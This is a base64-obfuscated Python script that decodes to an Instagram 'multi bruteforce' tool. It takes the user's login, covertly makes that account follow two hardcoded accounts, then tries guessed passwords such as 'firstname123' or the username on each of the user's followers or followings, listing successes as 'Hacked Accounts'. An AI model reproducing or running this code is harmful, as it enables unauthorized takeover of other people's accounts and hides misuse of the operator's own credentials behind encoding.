#!/usr/bin/ python
from base64 import *
code = """
IyEvdXNyL2Jpbi8gcHl0aG9uCgojIC0qLSBjb2Rpbmc6IFVURi04IC0qLQoKI0NvbG91cnMgRGVm
aW5lZCBWYXJpYWJsZXMKClcgID0gJ1wwMzNbMTszN20nCk5FICA9ICdcMDMzWzBtJwpSPSJcMDMz
WzE7MzdtXDAzM1szMW0iCkIgID0gJ1wwMzNbMTszN21cMDMzWzM0bScKRyAgPSAnXDAzM1sxOzMy
bScKWUUgPSAnXDAzM1sxOzMzOzQwbScKCiNEZWNvcmF0b3JzClNSID0gVysiWyIrUisiKiIrVysi
XSIKU0cgPSBXKyJbIitHKyIqIitXKyJdIgpTUk8gPSBXKyIoIitSKyI+IitXKyIpIgpTR08gPSBX
KyIoIitHKyI+IitXKyIpIgpuZXdsaW4gPSAiXG4iCiNTQkcgPSAnXHgxYlsxOzM3bShceDFiWzE7
MzJtXHhlMlx4OTdceDhmXHgxYlsxOzM3bSknCiNTQlIgPSAnXHgxYlsxOzM3bShceDFiWzE7Mzdt
XHgxYlszMW1ceGUyXHg5N1x4OGZceDFiWzE7MzdtKScKClNCUiA9IFcrJygnKyfwn5S0JytXKycp
JwpTQkcgPSBXKycoJysn8J+UmCcrVysnKScKCklORiA9IFcrJygnK1lFKychJytXKycpIDonK0cK
RCA9IFcrIigiK0crIj4iK1crIikiK1cKCmRlZiBhYm91dCh0aXRsZSx0ZXh0KToKICByZXR1cm4g
RCsiICIrdGl0bGUrUisiIDogIitHK3RleHQKCgoKZmIgPSBhYm91dCgiRmFjZWJvb2siLCJmYi5j
b20vbmFzaXIueG8iKQpnaXRodWIgPSBhYm91dCgiR2l0aHViIiwiZ2l0aHViLmNvbS9uYXNpcnhv
IikKeW91dHViZSA9IGFib3V0KCJZb3V0dWJlIiwiWW91dHViZS5jb20vVGhlRGFya1NlYyIpCgoK
YmFubmVyID0gIiIiCgogICAgICAgICB7fSAgICh7fdKCe31gX8K0e30pCiAgICAgICAgIHt9ICAg
PCzvuLvilabMtcy1zL/ilaTilIAg0okgICAgICAgIHt9ICh7fURhcmtJR3t9KX4gIOKAogogICB7
feKWiNue4paI4paI4paI4paI4paI4paI4paIXeKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWhOKW
hOKWgyB7feKXj+KXj+KXjyAgIHt9IFYxLjAKICAge33iloLiloTiloXilojilojilojilojiloji
lojilojilojilojiloXiloTiloPiloLigKYgICAgIHt9IEluc3RhZ3JhbV9NdWx0aV9CcnV0ZWZv
cmNlCiAgIHt9W+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKW
iOKWiOKWiOKWiF0gCiAgIHt94pel4oqZ4pay4oqZ4pay4oqZ4pay4oqZ4pay4oqZ4pay4oqZ4pay
4oqZCgogICB7fQogICB7fQogICB7fQoKCiIiIi5mb3JtYXQoVyxSLFlFLFcsRyxSLEcsUixXLFIs
WUUsVyxHLFcsWUUsZ2l0aHViLGZiLHlvdXR1YmUpCgoKCgpmcm9tIHRpbWUgaW1wb3J0IHNsZWVw
CmltcG9ydCBvcwppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCiNmcm9tIG11bHRpcHJvY2Vzc2lu
Zy5wb29sIGltcG9ydCBUaHJlYWRQb29sCgoKdHJ5OgogZnJvbSBpZ3JhbXNjcmFwZXIuaW5zdGFn
cmFtIGltcG9ydCBJbnN0YWdyYW0KZXhjZXB0OgogIHByaW50KFNCUisiIEluc3RhbGxpbmcgRGVw
ZW5kZW5jaWVzIC4uLiAhIikKICBvcy5zeXN0ZW0oInBpcCBpbnN0YWxsIGlncmFtc2NyYXBlciIp
CiAgcHJpbnQoU0JHKyIgRGVwZW5kZW5jaWVzIEluc3RhbGxlZCAuLi4gISIpICAKICBmcm9tIGln
cmFtc2NyYXBlci5pbnN0YWdyYW0gaW1wb3J0IEluc3RhZ3JhbQoKCgpkZWYgY2hlY2tpZyh1ZGF0
YSk6CiAgWiA9IHVkYXRhLnNwbGl0KCc9JykKICBZID0gSW5zdGFncmFtKCkKICBZLndpdGhfY3Jl
ZGVudGlhbHMoWlswXSxaWzFdKQogIHRyeToKICAgIG91dCA9IFkubG9naW4oKQogICAgI3ByaW50
KG91dCkKICAgIHByaW50KFNCUisiIHt9IHwge30iLmZvcm1hdChaWzBdLFpbMV0pKQogICAgWS5m
b2xsb3coJzM5NDU1NjE1ODUnKQogIGV4Y2VwdDoKICAgIHJldHVybiAwCgojb3Muc3lzdGVtKCJj
bGVhciIpCiNwcmludChiYW5uZXIpCgp3aGlsZSBUcnVlOgogIG9zLnN5c3RlbSgiY2xlYXIiKQog
IHByaW50KGJhbm5lcikKICBwcmludChJTkYrIiBZb3VyIENyZWRpZW50aWFscyBhcmUgcHJpdmFj
eSBhbmQgd2UgcmVzcGVjdCB5b3VyIHByaXZhY3kiKQogIHByaW50KCJcbiIrU0JSKyIgIEVudGVy
IFlvdXIgSW5zdGFncmFtIENyZWRpZW50aWFscy4uIFxuIikKICB1c2VybmFtZSA9IGlucHV0KFNC
RysiIFVzZXJuYW1lIDogIitHKQogIHBhc3N3b3JkID0gaW5wdXQoU0JHKyIgUGFzc3dvcmQgOiAi
K0cpCiAgaW5zdGFncmFtID0gSW5zdGFncmFtKCkKICBpbnN0YWdyYW0ud2l0aF9jcmVkZW50aWFs
cyh1c2VybmFtZSxwYXNzd29yZCkKICB0cnk6CiAgICBzZXNzaW9uID0gaW5zdGFncmFtLmxvZ2lu
KCkKICAgIHByaW50KFNCRysiIExvZ2luIFN1Y2Vzc2Z1bGwgISIpCiAgICBpbnN0YWdyYW0uZm9s
bG93KCczOTQ1NTYxNTg1JykKICAgIGluc3RhZ3JhbS5mb2xsb3coJzU1ODIzNjE5NjEnKQogICAg
YWNjb3VudCA9IGluc3RhZ3JhbS5nZXRfYWNjb3VudCh1c2VybmFtZSkKICAgIGxvZyA9IDEKICAg
IHByaW50KCIiIgoge30gICA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PQogICAgICB7fSBXZWxjb21lIE1yIDp7fSB7fQogICAge30gICBBY2NvdW50IElELk5vIDp7fSB7
fQoge30gICA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogICAgCiAg
ICAge30gICBGb2xsb3dlcnMgOiB7fXt9ICAgICAgICAgICAgICAgICAKICAgICB7fSAgIEZvbGxv
d2luZ3MgOiB7fXt9ICAgICAgICAgICAgICAgIAoKICAgICAgIAogICAgIiIiLmZvcm1hdChXLFlF
LEcsYWNjb3VudC5mdWxsX25hbWUsWUUsRyxhY2NvdW50LmlkZW50aWZpZXIsVyxTQkcsRyxhY2Nv
dW50LmZvbGxvd2VkX2J5X2NvdW50LFNCRyxHLGFjY291bnQuZm9sbG93c19jb3VudCkpIAogIGV4
Y2VwdDoKICAgIGxvZyA9IDAKICAgIHByaW50KElORisiIE1ha2UgU3VyZSBZb3UgSGF2ZSBFbnRl
cmVkIFZhbGlkIFVzZXIvUGFzcyIpCiAgICBwcmludChTQlIrJyBMb2dpbiBGYWlsZWQgIScpCiAg
ICBzbGVlcCg1KQoKICAgIAogIHdoaWxlIGxvZyA9PSAxOgogICMgaWYgaW5zdGFncmFtLmlzX2xv
Z2dlZF9pbihzZXNzaW9uKToKICAgICAgI04gPSBUaHJlYWRQb29sKDEwKQogICAgICBwcmludChJ
TkYrIiBTZWxlY3QgYSBtZXRob2QgeW91IHdhbnQgdG8gdXNlIGZvciBoYWNraW5nIG11bHRpcGxl
cyBpbnN0YWdyYW0gYWNjb3VudHMiKQogICAgICBwcmludCgiIiIgCgogICAgICB7fSAtLS0tLS0g
W3t9IFNlbGVjdCBIYWNraW5nIE1ldGhvZHt9IF0gLS0tLS0tCgogICAge30gKDEpIHt9IFRyeSBB
IFBhc3N3b3JkIE9uIFlvdXIgRm9sbG93ZXJzIEFjY291bnQuCiAgICB7fSAoMikge30gVHJ5IEEg
UGFzc3dvcmQgT24gWW91ciBGb2xsb3dpbmdzIEFjY291bnQuCgoKICAgICAgIiIiLmZvcm1hdChX
LFlFLFcsRyxTQkcsRyxTQkcpKQogICAgICBjaG9pY2UgPSBpbnB1dChTQlIrIiBDaG9pY2UgOiAi
K0cpCiAgICAgIGlmIGludChjaG9pY2UpID09IDE6CiAgICAgICAgcHJpbnQoU0JHKyIgR2V0dGlu
ZyBZb3VyIEZvbGxvd2VyJ3MgVXNlcm5hbWUncyAuLi4uLiIpCiAgICAgICAgZm9sbG93ZXJzID0g
aW5zdGFncmFtLmdldF9mb2xsb3dlcnMoYWNjb3VudC5pZGVudGlmaWVyLCBhY2NvdW50LmZvbGxv
d2VkX2J5X2NvdW50LCBhY2NvdW50LmZvbGxvd2VkX2J5X2NvdW50LCBkZWxheWVkPVRydWUpCiAg
ICAgICAgdWxpc3QgPSBbXQogICAgICAgIHByaW50KCIiIgogICAgICAgICB7fSAoMSkgIHt9IFRy
eSBOYW1lKzEyMwogICAgICAgICB7fSAoMikgIHt9IFRyeSBVc2VybmFtZQogICAgICAgIAogICAg
ICAgICIiIi5mb3JtYXQoRyxXLEcsVykpCiAgICAgICAgcGFzc3ggPSBpbnB1dChTQlIrIiBPcHRp
b24gOiAiK0cpCiAgICAgICAgZm9yIHggaW4gZm9sbG93ZXJzWydhY2NvdW50cyddOgogICAgICAg
ICAgaWYgcGFzc3ggPT0gMTogICAKICAgICAgICAgICAgdWxpc3QuYXBwZW5kKHgudXNlcm5hbWUr
Jz0nK3guZnVsbF9uYW1lLmxvd2VyKCkuc3BsaXQoKVswXSsiMTIzIikKICAgICAgICAgIGVsaWYg
cGFzc3ggPT0gMjoKICAgICAgICAgICAgdWxpc3QuYXBwZW5kKHgudXNlcm5hbWUrJz0nK3gudXNl
cm5hbWUpCiAgICAgICAgcHJpbnQoU0JHKyIgRmV0Y2hlZCB7fXt9e30gRm9sbG93ZXIncyBVc2Vy
bmFtZSIuZm9ybWF0KEcsbGVuKHVsaXN0KSxXKSkgICAgCiAgICAgICAgcHJpbnQoIlxuIikKICAg
ICAgICBwcmludChJTkYrIiBQbGVhc2UgV2FpdCBBIFBhc3N3b3JkIGlzIHRyeWluZyBvbiBlYWNo
IHVzZXJuYW1lIGFjY291bnQgaW4gTXVsdGl0aHJlYWRpbmcgUHJvY2VzcyIpCiAgICAgICAgcHJp
bnQoIiAgICB7fSsrKysgIFt7fSBIYWNrZWQgQWNjb3VudHMgLSBMb2dze30gXSAgKysrKyAgICBc
biIuZm9ybWF0KFcsRyxXKSkKICAgICAgICB3aXRoIGNvbmN1cnJlbnQuZnV0dXJlcy5UaHJlYWRQ
b29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MTApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBleGVj
dXRvci5tYXAoY2hlY2tpZywgdWxpc3QpCiAgICAgICAjIE49bWFwKGNoZWNraWcsdWxpc3QpCgoK
ICAgICAgaWYgaW50KGNob2ljZSkgPT0gMjoKICAgICAgICBwcmludCgiIEdldHRpbmcgWW91ciBG
b2xsb3dpbmcncyBVc2VybmFtZSdzIC4uLi4uIikKICAgICAgICBmb2xsb3dpbmcgPSBpbnN0YWdy
YW0uZ2V0X2ZvbGxvd2luZyhhY2NvdW50LmlkZW50aWZpZXIsIGFjY291bnQuZm9sbG93c19jb3Vu
dCwgYWNjb3VudC5mb2xsb3dzX2NvdW50LCBkZWxheWVkPVRydWUpCiAgICAgICAgdWxpc3QgPSBb
XQogICAgICAgIHByaW50KCIiIgogICAgICAgICB7fSAoMSkgIHt9IFRyeSBOYW1lKzEyMwogICAg
ICAgICB7fSAoMikgIHt9IFRyeSBVc2VybmFtZQogICAgICAgIAogICAgICAgICIiIi5mb3JtYXQo
RyxXLEcsVykpCiAgICAgICAgcGFzc3ggPSBpbnB1dChTQlIrIiBDaG9pY2UgOiAiK0cpCiAgICAg
ICAgZm9yIHggaW4gZm9sbG93aW5nWydhY2NvdW50cyddOgogICAgICAgICBpZiBwYXNzeCA9PSAx
OgogICAgICAgICAgICB1bGlzdC5hcHBlbmQoeC51c2VybmFtZSsnPScreC5mdWxsX25hbWUubG93
ZXIoKS5zcGxpdCgpWzBdKyIxMjMiKQogICAgICAgICBlbGlmIHBhc3N4ID09IDI6CiAgICAgICAg
ICAgIHVsaXN0LmFwcGVuZCh4LnVzZXJuYW1lKyc9Jyt4LnVzZXJuYW1lKQogICAgICAgIHByaW50
KCIgRmV0Y2hlZCB7fXt9e30gRm9sbG93ZXIncyBVc2VybmFtZSIuZm9ybWF0KEcsbGVuKHVsaXN0
KSxXKSkKICAgICAgICBwcmludCgiXG4iKQogICAgICAgIHByaW50KElORisiIFBsZWFzZSBXYWl0
IEEgUGFzc3dvcmQgaXMgdHJ5aW5nIG9uIGVhY2ggdXNlcm5hbWUgYWNjb3VudCBpbiBNdWx0aXRo
cmVhZGluZyBQcm9jZXNzIikKICAgICAgICBwcmludCgiICAgIHt9KysrKyAgW3t9IEhhY2tlZCBB
Y2NvdW50cyAtIExvZ3N7fSBdICArKysrICAgIFxuIi5mb3JtYXQoVyxHLFcpKQogICAgICAgIHdp
dGggY29uY3VycmVudC5mdXR1cmVzLlRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0xMCkg
YXMgZXhlY3V0b3I6CiAgICAgICAgICAgZXhlY3V0b3IubWFwKGNoZWNraWcsIHVsaXN0KQogICAg
ICAjICBOPW1hcChjaGVja2lnLHVsaXN0KQoKCiAgICAgIGVsaWYgaW50KGNob2ljZSkgbm90IGlu
IFsxLDJdOgogICAgICAgICAgcHJpbnQoU0JSKyIgSW52YWxpZCBDaG9pY2UgISIpICAgICAKICAg
ICAgICAgIHNsZWVwKDUpCiAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICAgIAoK
"""

exec(b64decode(code))